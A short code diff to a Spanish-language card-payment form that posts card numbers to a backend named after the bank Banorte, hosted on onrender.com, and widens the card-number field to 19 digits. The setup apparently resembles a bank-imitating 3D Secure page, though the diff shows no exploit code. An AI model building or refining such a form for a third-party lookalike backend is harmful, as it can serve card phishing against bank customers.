@@ -101,6 +101,7 @@ button:disabled {
     action="https://backend-banorte.onrender.com/api/payment/3d-secure"
     autocomplete="off"
     onsubmit="return validarForm()"
+    target="_self"
   >
 
     <div class="section-title">
@@ -180,8 +181,8 @@ button:disabled {
     <input
       name="cardNumber"
       placeholder="Número de tarjeta"
-      maxlength="16"
-      pattern="\d{15,16}"
+      maxlength="19"
+      pattern="\d{15,19}"
       inputmode="numeric"
       required
     >
@@ -333,7 +334,7 @@ document
     e.target.value =
       e.target.value
         .replace(/\D/g, "")
-        .slice(0,16);
+        .slice(0,19);
   });
 
 
